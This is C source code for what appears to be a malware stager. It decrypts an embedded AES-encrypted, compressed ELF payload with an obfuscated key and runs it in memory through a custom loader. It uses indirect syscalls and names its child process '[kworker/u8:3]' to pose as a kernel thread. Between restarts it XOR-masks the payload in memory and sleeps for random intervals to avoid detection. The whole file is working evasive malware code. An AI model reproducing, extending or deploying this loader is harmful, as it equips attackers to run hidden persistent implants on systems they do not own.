#define _GNU_SOURCE
#include "aes.h"
#include "elf_loader.h"
#include "syscalls.h"
#include "tinf.h"
#include "utils.h"

#ifndef CONFIG_XOR_KEY
#define CONFIG_XOR_KEY 0x5A
#endif

#ifndef SLEEP_MAX
#define SLEEP_MAX 60
#endif

#ifndef SLEEP_MIN
#define SLEEP_MIN 10
#endif

#ifndef STAGE1_SIZE
#define STAGE1_SIZE 0
#endif

#ifndef ENCODED_KEY
#define ENCODED_KEY 0x00
#endif

#define SEED_FD 3
#define EINTR 4
#define EAGAIN 11

static const unsigned char encoded_key[] = {ENCODED_KEY};

static void decode_config_string(char *dest, const unsigned char *encoded,
                                 size_t max_len);
static void derive_key_from_string(const char *str, uint8_t *key);
static size_t decrypt_data(char *data, size_t data_size, const uint8_t *key,
                           const uint8_t *iv);
static int build_payload_from_encrypted(char *enc_buf, size_t enc_size,
                                        const uint8_t *key, char **out_buf,
                                        size_t *out_size);
void xor_data(char *data, size_t len, const uint8_t *key, size_t key_len);
static void get_random_safe(void *buf, size_t len);
static void write_safe(int fd, const void *buf, size_t len);

void stage1_main(void *base_addr, size_t total_size);

__asm__(".section .init,\"ax\",@progbits\n"
        ".global _start\n"
        "_start:\n"
        "call stage1_main\n"
        "ret\n");

void stage1_main(void *base_addr, size_t total_size) {
  init_indirect_syscalls();

  if (!base_addr || total_size <= STAGE1_SIZE + 16) {
    exit(1);
  }

  char module_path[256] = {0};
#ifdef ENCODED_MODULE_PATH
  static const unsigned char encoded_module_path[] = {ENCODED_MODULE_PATH};
  decode_config_string(module_path, encoded_module_path, sizeof(module_path));
#endif

  char key_str[256] = {0};
  uint8_t key[16] = {0};
  decode_config_string(key_str, encoded_key, sizeof(key_str));
  derive_key_from_string(key_str, key);

  char *payload = (char *)base_addr + STAGE1_SIZE;
  size_t payload_size = total_size - STAGE1_SIZE;

  char *final_data = NULL;
  size_t final_size = 0;
  if (build_payload_from_encrypted(payload, payload_size, key, &final_data,
                                   &final_size) != 0 ||
      !final_data || final_size == 0) {
    exit(1);
  }

  Elf_Ehdr *hdr = (Elf_Ehdr *)final_data;

  size_t min_vaddr = 0, max_vaddr = 0;
  if (elf_get_memory_bounds(final_data, &min_vaddr, &max_vaddr) != 0) {
    exit(1);
  }

  size_t map_len = max_vaddr - min_vaddr;
  void *shared_mem = NULL;
  if (hdr->e_type == ET_DYN) {
    shared_mem = (void *)mmap(NULL, map_len, PROT_READ | PROT_WRITE,
                              MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  } else {
    shared_mem =
        (void *)mmap((void *)min_vaddr, map_len, PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
  }

  if (shared_mem == MAP_FAILED) {
    exit(1);
  }

  uint8_t rotator_key[16] = {0};
  char worker_seed[32];
  get_random_safe(worker_seed, 32);
  debug_print("Stager: Generated worker_seed (32 bytes)\n");

  while (1) {
    long pid = fork();
    if (pid == 0) {
      int seed_pipe[2];
      if (pipe(seed_pipe) == 0) {
        write_safe(seed_pipe[1], worker_seed, 32);
        close(seed_pipe[1]);

        if (seed_pipe[0] != SEED_FD) {
          if (dup2(seed_pipe[0], SEED_FD) != SEED_FD) {
            debug_print("Stager Child: Failed to dup2 to SEED_FD\n");
          }
          close(seed_pipe[0]);
        }
        debug_print("Stager Child: Seed injected into SEED_FD (3)\n");
      }

      size_t base_addr_arg = 0;
      if (hdr->e_type == ET_DYN) {
        base_addr_arg = (size_t)shared_mem;
      }

      char *child_argv[] = {(char *)"[kworker/u8:3]", NULL};
      char *child_envp[] = {NULL};
      elf_run(final_data, child_argv, child_envp, 1, module_path,
              base_addr_arg);
      exit(0);
    }

    if (pid > 0) {
      int status = 0;
      long res = waitpid((int)pid, &status, 0);
      if (res != pid)
        break;

      get_random_safe(rotator_key, 16);
      xor_data((char *)shared_mem, map_len, rotator_key, 16);

      unsigned int sleep_s = 0;
      get_random_safe(&sleep_s, sizeof(sleep_s));
      unsigned int sleep_range = SLEEP_MAX - SLEEP_MIN;
      sleep_s = SLEEP_MIN + (sleep_s % sleep_range);

      debug_print("Stager Parent: Agent exited, sleeping for %d seconds before "
                  "restart\n",
                  sleep_s);
      struct timespec req = {sleep_s, 0};
      nanosleep(&req, NULL);

      xor_data((char *)shared_mem, map_len, rotator_key, 16);
      debug_print("Stager Parent: Restarting agent...\n");
      continue;
    }

    break;
  }

  exit(0);
}

static int build_payload_from_encrypted(char *enc_buf, size_t enc_size,
                                        const uint8_t *key, char **out_buf,
                                        size_t *out_size) {
  if (!enc_buf || enc_size <= 16 || !out_buf || !out_size)
    return -1;

  uint8_t iv[16];
  memcpy(iv, enc_buf, 16);
  size_t encrypted_body = enc_size - 16;
  char *cipher = enc_buf + 16;

  decrypt_data(cipher, encrypted_body, key, iv);

  unsigned int capacity = (unsigned int)encrypted_body * 10;
  char *decomp = NULL;
  int res = TINF_OK;
  unsigned int out_len = 0;

  for (int attempt = 0; attempt < 3; attempt++) {
    decomp = calloc(capacity, sizeof(char));
    if (!decomp)
      return -1;
    out_len = capacity;
    res = tinf_uncompress(decomp, &out_len, cipher, encrypted_body);
    if (res == TINF_OK)
      break;
    free(decomp);
    decomp = NULL;
    capacity *= 2;
  }

  if (res != TINF_OK || !decomp)
    return -1;

  *out_buf = decomp;
  *out_size = out_len;
  return 0;
}

static size_t decrypt_data(char *data, size_t data_size, const uint8_t *key,
                           const uint8_t *iv) {
  struct AES_ctx ctx;
  AES_init_ctx_iv(&ctx, key, iv);
  AES_CTR_xcrypt_buffer(&ctx, (uint8_t *)data, data_size);
  return data_size;
}

void xor_data(char *data, size_t len, const uint8_t *key, size_t key_len) {
  for (size_t i = 0; i < len; i++) {
    data[i] ^= key[i % key_len];
  }
}

static void get_random_safe(void *buf, size_t len) {
  size_t total = 0;
  char *p = (char *)buf;
  while (total < len) {
    long ret = getrandom(p + total, len - total, 0);
    if (ret < 0) {
      if (ret == -EINTR || ret == -EAGAIN)
        continue;
      break;
    }
    if (ret == 0)
      break;
    total += (size_t)ret;
  }
}

static void write_safe(int fd, const void *buf, size_t len) {
  size_t total = 0;
  const char *p = (const char *)buf;
  while (total < len) {
    long ret = write(fd, p + total, len - total);
    if (ret < 0) {
      if (ret == -EINTR || ret == -EAGAIN)
        continue;
      break;
    }
    if (ret == 0)
      continue;
    total += (size_t)ret;
  }
}

static void decode_config_string(char *dest, const unsigned char *encoded,
                                 size_t max_len) {
  size_t i = 0;
  while (i < max_len - 1) {
    if (encoded[i] == 0x00)
      break;
    dest[i] = encoded[i] ^ CONFIG_XOR_KEY;
    i++;
  }
  dest[i] = '\0';
}

static void derive_key_from_string(const char *str, uint8_t *key) {
  uint32_t temp_key[4] = {0};
  size_t len = strlen(str);
  for (int i = 0; i < 4; i++) {
    for (size_t j = 0; j < len / 4; j++) {
      temp_key[i] ^= ((uint32_t)str[i + j * 4]) << (j % 4 * 8);
    }
  }
  memcpy(key, temp_key, 16);
}
